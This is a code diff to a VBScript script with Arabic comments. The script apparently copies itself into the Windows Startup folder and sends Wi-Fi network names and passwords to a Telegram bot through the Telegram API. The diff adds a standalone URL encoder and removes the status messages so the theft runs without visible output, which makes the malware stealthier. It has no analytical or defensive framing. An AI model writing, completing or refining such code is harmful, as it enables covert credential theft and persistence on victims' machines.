@@ -1,3 +1,4 @@
+' إنشاء كائن Shell لتنفيذ الأوامر
 Set objShell = CreateObject("WScript.Shell")
 
 ' نسخ السكربت إلى مجلد بدء التشغيل
@@ -74,9 +75,30 @@ Sub SendToTelegram(networkName, password)
     ' نص الرسالة
     message = "اسم الشبكة: " & networkName & vbCrLf & "كلمة المرور: " & password
 
+    ' تشفير النص للاستخدام في URL
+    Function URLEncode(text)
+        Dim i, char, encodedText
+        encodedText = ""
+        For i = 1 To Len(text)
+            char = Mid(text, i, 1)
+            If char >= "A" And char <= "Z" Then
+                encodedText = encodedText & char
+            ElseIf char >= "a" And char <= "z" Then
+                encodedText = encodedText & char
+            ElseIf char >= "0" And char <= "9" Then
+                encodedText = encodedText & char
+            ElseIf char = " " Then
+                encodedText = encodedText & "+"
+            Else
+                encodedText = encodedText & "%" & Hex(Asc(char))
+            End If
+        Next
+        URLEncode = encodedText
+    End Function
+
     ' إرسال الرسالة عبر API Telegram
     url = "https://api.telegram.org/bot" & botToken & "/sendMessage"
-    postData = "chat_id=" & chatID & "&text=" & Server.URLEncode(message)
+    postData = "chat_id=" & chatID & "&text=" & URLEncode(message)
 
     ' إنشاء كائن XMLHTTP لإرسال الطلب
     Set http = CreateObject("MSXML2.XMLHTTP")
@@ -86,8 +108,8 @@ Sub SendToTelegram(networkName, password)
 
     ' التحقق من نجاح الإرسال
     If http.status = 200 Then
-        WScript.Echo "تم إرسال البيانات إلى Telegram بنجاح."
+        ' لا تفعل شيئًا، لأننا لا نريد إظهار أي مخرجات
     Else
-        WScript.Echo "فشل إرسال البيانات إلى Telegram."
+        ' لا تفعل شيئًا، لأننا لا نريد إظهار أي مخرجات
     End If
 End Sub
